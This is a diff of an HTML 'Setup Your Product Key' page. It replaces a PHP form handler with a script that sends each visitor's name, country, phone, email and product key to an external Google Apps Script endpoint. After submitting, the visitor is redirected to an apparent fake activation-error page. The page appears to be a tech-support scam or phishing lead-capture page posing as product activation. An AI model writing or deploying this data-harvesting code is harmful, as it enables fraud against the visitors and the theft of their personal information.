@@ -163,43 +163,57 @@ s0.parentNode.insertBefore(s1,s0);
 		</div>
 		<div class="col-lg-6 col-md-6 col-sm-6 respon-foot">
 			<div class="col-lg-6 col-md-12 form-header nor-for-af" >
-				<form action="sendqueryy.php" id="loginform" method="post" name="queryform">
-					<h5 class="text-center product-heading">Setup Your Product Key</h5>
-					<p class="text-center" style="font-size: 12px;">Enter your information below to setup now</p>
-                    <p class="text-center" style="font-size: 12px;margin-top:12px;text-shadow: 0.5px 0px 0px #000;"><b><p class="text-center" style="font-size: 12px;margin-top:12px;color: #1b07bd;">Enter your phone number and we will send you a verification code to confirm your identity</p></b></p>
+				<form id="loginform" name="queryform">
+  <h5 class="text-center product-heading">Setup Your Product Key</h5>
+  <p class="text-center" style="font-size: 12px;">Enter your information below to setup now</p>
+  <p class="text-center" style="font-size: 12px;margin-top:12px;color: #1b07bd;">
+    Enter your phone number and we will send you a verification code to confirm your identity
+  </p>
 
-                    <br>
-					<div class="form-group">
-						<input type="text" id="nameField" name="name" class="form-control input-cls" placeholder="Full Name" required>
-					</div>
-                    <div class="form-group">
-						<select class="form-control input-cls" id="countField" name="country"  id="sel1" required>
-							<option value="">Country</option>
-							<option value="United States">United States +1</option>
-							<option value="Canada">Canada +1</option>
-							<option value="Australia">Australia +61</option>
-							<option value="United Kingdom">United Kingdom +44</option>
-							<option value="New Zealand">New Zealand +64</option>
-							<option value="Other">Other</option>
-						</select>
-					</div>
-					<div class="form-group">
-						<input type="text" id="mobField" pattern= "[0-9]+" name="mobile"  class="form-control input-cls" placeholder="Contact No." required>
-					</div>
-					<div class="form-group">
-						<input type="email" id="emailField" name="email" class="form-control input-cls" placeholder="Email" required>
-					</div>
-					
-					<div class="form-group">
-						<input type="text" id="keyField" name="productkey"  class="form-control input-cls" placeholder="Product Key" required>
-						<input type="hidden"  id="ipField" name="entry.272839618"  value="124.253.180.251" class="form-control input-cls" placeholder="Product Key">
-						<input type="hidden" id="osField" name="entry.2081955745" value="" class="form-control input-cls" placeholder="Product Key">
-						<input type="hidden" id="browserField" name="entry.446874084" value="Unknown ?" class="form-control input-cls" placeholder="Product Key">
-					</div>
-					<div class="col-lg-6">
-						<input type="submit" name="submit" class="form-control submit-btn" value="Submit" onclick="sendpost()">
-					</div>
-				</form>
+  <div class="form-group">
+    <input type="text" id="nameField" name="name" class="form-control input-cls" placeholder="Full Name" required>
+  </div>
+
+  <div class="form-group">
+    <select class="form-control input-cls" id="countField" name="country" required>
+      <option value="">Country</option>
+      <option value="United States">United States +1</option>
+      <option value="Canada">Canada +1</option>
+      <option value="Australia">Australia +61</option>
+      <option value="United Kingdom">United Kingdom +44</option>
+      <option value="New Zealand">New Zealand +64</option>
+      <option value="Other">Other</option>
+    </select>
+  </div>
+
+  <div class="form-group">
+    <input type="text" id="mobField" pattern="[0-9]+" name="mobile" class="form-control input-cls" placeholder="Contact No." required>
+  </div>
+
+  <div class="form-group">
+    <input type="email" id="emailField" name="email" class="form-control input-cls" placeholder="Email" required>
+  </div>
+
+  <div class="form-group">
+    <input type="text" id="keyField" name="productkey" class="form-control input-cls" placeholder="Product Key" required>
+  </div>
+
+  <div class="col-lg-6">
+    <input type="submit" name="submit" class="form-control submit-btn" value="Submit">
+  </div>
+</form>
+
+<script>
+  const scriptURL = "https://script.google.com/macros/s/AKfycbypP1p-TYzmFPLuK-OdKIkY6KNEcwt1O5RUT1WLUggwks25dPVry8n_k4CSpPbnFpTsdQ/exec";
+  const form = document.getElementById("loginform");
+
+  form.addEventListener("submit", e => {
+    e.preventDefault();
+    fetch(scriptURL, { method: "POST", body: new FormData(form)})
+      .then(() => window.location.href = "actnor-err.html")
+      .catch(error => console.error("Error!", error.message));
+  });
+</script>
 			</div>
 		</div>
 	</div>
